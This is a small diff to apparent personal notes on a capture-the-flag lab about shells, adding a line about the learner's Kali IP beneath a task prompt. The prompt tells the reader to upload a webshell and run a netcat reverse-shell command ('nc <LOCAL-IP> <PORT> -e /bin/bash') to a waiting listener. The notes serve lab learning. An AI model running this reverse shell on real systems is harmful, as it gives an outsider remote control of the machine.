@@ -619,5 +619,7 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 *Answer the questions below*  
 
-Try uploading a webshell to the Linux box, then use the command: _nc <LOCAL-IP> <PORT> -e /bin/bash_ to send a reverse shell back to a waiting listener on your own machine.
+Try uploading a webshell to the Linux box, then use the command: _nc <LOCAL-IP> <PORT> -e /bin/bash_ to send a reverse shell back to a waiting listener on your own machine.  
+
+We fire up the kali machine, run ifconfig and we see the IP is 10.65.78.242  
 
